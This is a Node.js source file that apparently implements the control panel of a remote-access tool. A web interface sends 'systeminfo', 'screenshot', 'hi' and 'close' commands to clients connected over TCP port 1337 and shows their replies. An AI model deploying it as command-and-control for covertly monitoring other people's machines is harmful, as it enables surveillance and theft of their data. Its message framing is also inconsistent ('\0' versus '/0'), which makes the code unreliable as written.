var app = require('express')();
var http = require('http').Server(app);
var net = require('net');
var io = require('socket.io')(http);

const TCP_PORT = 1337;
const WS_PORT = 3000;
var clients = {};

app.get('/', function(req, res){
  res.sendfile('index.html');
});

io.on('connection', function(socket){

  socket.on('client:send', function(obj) {
    switch (obj.cmd) {
      case 'off':
        console.log('send close', obj);
        clients[obj.sid].socket.write('close\0');
        break;
      case 'hi':
        console.log('send hi', obj);
        clients[obj.sid].socket.write('hi\0');
        break;
      case 'systeminfo':
        console.log('send systeminfo', obj);
        clients[obj.sid].socket.write('systeminfo\0');
        break;
      case 'screenshot':
        console.log('send screenshot', obj);
        clients[obj.sid].socket.write('screenshot\0');
        break;
    }
  });

});

function newClient(c) {
  io.emit('client:connect', c);
}

function disconnectClient(c) {
  console.log('disconnect client');
  io.emit('client:disconect', c);
}

function updateClient(c, cmd) {
  io.emit('client:update', {sid: c, uid: clients[c].uid, msg: cmd});

  // if (cmd[0] == '{') cmd = JSON.parse(cmd);
  // if (cmd.screenshot) {
  //   fs.writeFile("./imi.bmp", msg.screenshot, function(err) {
  //     if(err) {
  //       return console.log(err);
  //     }
  //
  //     console.log("The file was saved!");
  //   }); 
  // }
}


var server = net.createServer(function(socket) {
  const idx = Math.floor(Math.random() * 999999999);
  console.log('connection', idx);
  clients[idx] = {
    uid: '',
    socket,
    buffer: '',
  }
  newClient(idx);

  socket.on('data', function(chunk) {
    clients[idx].buffer += chunk;
  });
  
  socket.on('end', function() {
    clients[idx] = false;
    delete clients[idx];
    console.log('disconnected');
    disconnectClient(idx);
  });
});

function digest() {
  setTimeout(function() {
    for (var c in clients) {
      var sindex = clients[c].buffer.indexOf('/0');
      if (sindex != -1) {
        got(c, clients[c].buffer.slice(0, sindex));
        clients[c].buffer = clients[c].buffer.slice(sindex + 2);
      }
    }
    digest();
  }, 300);
}
digest();

function got(c, msg) {
  msg = msg.split('~~');
  console.log(c, msg);
  if (!clients[c].uid) clients[c].uid = msg[0];
  updateClient(c, msg[1]);
}

server.listen(TCP_PORT);
http.listen(WS_PORT, function(){
  console.log('listening on *:', WS_PORT);
});